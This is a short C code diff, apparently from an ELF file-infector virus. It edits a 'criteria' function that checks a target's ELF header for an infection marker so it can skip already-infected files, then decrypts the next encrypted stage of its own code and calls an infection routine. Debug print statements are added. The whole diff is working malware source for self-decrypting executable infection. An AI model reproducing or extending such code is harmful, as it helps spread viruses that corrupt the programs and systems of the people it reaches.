@@ -21,9 +21,11 @@ void criteria(struct s_host *host, struct s_keychain *keychain)
 	if (*(unsigned int *)((char *)&host->header->e_ident[EI_PAD]) == INFECTED_MAGIC_NUMBER)
 		goto label_error;
 
-	update_keychain_left(keychain, (char *)criteria, (void *)infection_text - (void *)criteria);
-	decrypt_left(keychain, (char *)infection_text, (void *)__exit - (void *)infection_text);
-	infection_text(host);
+	update_keychain_left(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);
+	decrypt_left(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
+
+	printf("criteria\n\n");
+	text_infection(host, keychain);
 
 label_error:
 	printf("error\n");
